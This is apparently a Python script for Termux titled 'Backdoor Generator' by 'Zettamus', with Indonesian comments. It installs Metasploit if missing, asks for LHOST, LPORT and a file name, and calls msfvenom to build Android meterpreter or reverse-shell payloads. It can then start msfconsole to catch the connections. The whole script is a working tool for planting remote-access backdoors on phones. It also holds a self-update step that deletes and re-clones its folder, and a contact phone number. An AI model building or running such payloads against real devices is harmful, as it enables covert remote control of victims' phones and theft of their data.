# Coded : Zettamus
# Maaf, Codenya berantakan, h3h3
# Mau recode? Ok, tapi jangan hapus nama author yg ada di atas_-

import os,time, getpass, socket, requests
hostname = socket.gethostname()
IPAddr = socket.gethostbyname('google.com')
sleep=time.sleep
os=os.system
os('dpkg --configure -a')
os('clear')
try:
    versi='1.0'
    requp=requests.get('https://raw.githubusercontent.com/zettamus/backdoor/master/README.md').text
    if versi in str(requp):
        up='[99] Update '
        ver='[!] New version is available. Update now'
except Exception as f:
    print(str(f))
banner=('''
        ;;;;;;;;;;;;;;;;;;;;;;;;;;
        ;                        ;
        ;   BACKDOOR G3NERATOR   ;
        ;        Zettamus        ;
        ;;;;;;;;;;;;;;;;;;;;;;;;;;
        ''')
print(banner)
print('[!] Checking Metasploit')
sleep(2)
msf=os('which msfconsole > /dev/null 2>&1')
if msf == 0:
    print('[*] Metasploit Found')
else:
    ins=input('[*] Metasploit Not Found \n[!] Do you want to install [Y/n] : ')
    if ins =='':
        exit('[!] Exit: Ok!')
    elif ins in ['Y','y']:
        tanya=('[NOTE] This installation requires + 500Mb free space \n[!] Type "Exit" to exit')
        if tanya in ['Exit','exit','EXIT']:
            exit('[!] User Exit!')
        elif tanya=='':
            exit('[!] Dont be empty!')
        else:
            try:
                print('[!] Update Termux..')
                sleep(2)
                os('apt-get update -y;apt-get upgrade -y')
                print('[!] Installing X11-Repository and Unstable-Repo  ')
                os('apt-get install x11-repo -y;apt-get install unstable-repo -y > /dev/null 2>&1')
                print("[!] Metasploit Install..[!] \n[WARN] Do not exit the terminal\n[WARN] Don't do any surgery")
                io=os('apt-get install metasploit -y')
                if io ==0:
                    g=os('which msfconsole > /dev/null 2>&1')
                    if g ==0:
                        print('[!] Metasploit-Framework successfully installed in your device ')
                    else:
                        exit("[!] Sorry, Metasploit cannot be installed on your device \n[!] Contact me on WA : 081247483775")
                else:
                    exit("[!] Sorry, Metasploit cannot be installed on your device \n[!] Contact me on WA : 081247483775")
            except KeyboardInterrupt:
                print('[!] Ctrl - C Detected \n[!] Stopped all ')
                os('dpkg --configure -a')
                exit()

getpass.getpass('[*] Press [Enter] to Continue ')
os('clear')
print(banner)
print('[!] Hostname : '+hostname+'\n[!] IP Address : '+IPAddr)
try:
    print(ver)
except: pass
print()
print('[01] Create Backdoor')
print('[02] Jump to msfconsole')
try:
    print(up)
except: pass
print('[00] Exit')
zett=input('[#] Zettamus/> ')
if zett =='':
    exit('[!] Dont be empty')
elif zett in ['1','01']:

    print('\n[*] Choose Your method\n\n[1] android/meterpreter/reverse_https\n[2] android/meterpreter/reverse_http\n[3] android/meterpreter/reverse_tcp\n[4] android/shell/reverse_https\n[5] android/shell/reverse_http\n[6] android/shell/reverse_tcp')
    co=input('[#] Zettamus/> ')
    if co =='':
        exit('[!] Dont be empty')
    elif co in ['1','01']:
        method='android/meterpreter/reverse_https'
    elif co in ['2','02']:
        method='android/meterpreter/reverse_http'
    elif co in ['3','03']:
        method='android/meterpreter/reverse_tcp'
    elif co in ['4','04']:
        method='android/shell/reverse_https'
    elif co in ['5','05']:
        method='android/shell/reverse_http'
    elif co in ['6','06']:
        method='android/shell/reverse_tcp'
    else: exit('[!] Wrong Input ')
    lhost=input('[?] LHOST : ')
    if lhost =='':
        exit('[!] Dont be empty')
    lport=input('[?] LPORT : ')
    if lport =='':
        exit('[!] Dont be empty')
    nama=input('[?] Payload name : ')
    if nama =='':
        exit('[!] Dont be empty')
    print('[!] Running Proccess ')
    print('[!] Creating Payload with lhost',lhost,'and lport',lport)
    cr=os('msfvenom -p '+method+' LHOST='+lhost+' LPORT='+lport+' -o /data/data/com.termux/files/home/'+nama+' > /dev/null 2>&1')
    if cr == 0:
        print('[*] Succesfully creating backdoor payload\n[!] Payload saved it : home/'+nama)
    else:
        exit('[!] Error When Create backdoor')
    msf=input('[?] Do you want to jump to msfconsole [Y/n] : ')
    if msf in ['Y','y']:
        print('[!] Running Postgresql')
        os('pg_ctl -D $PREFIX/var/lib/postgresql start > /dev/null 2>&1')
        print('[!] Running msfconsole ')
        os('msfconsole')
    else:
        exit('[!] Exit: Ok!')
elif zett in ['2','02']:
    print('[!] Running Postgresql')
    os('pg_ctl -D $PREFIX/var/lib/postgresql start > /dev/null 2>&1')
    print('[!] Running msfconsole ')
    os('msfconsole')
elif zett ==99:
    os('cd ..;rm -rf backdoor')
    os('cd ..;git clone https://github.com/zettamus/backdoor')
elif zett in ['0','00']:
    exit('[!] Exit: Ok!')
else:
    exit('[!] Wrong Input ')
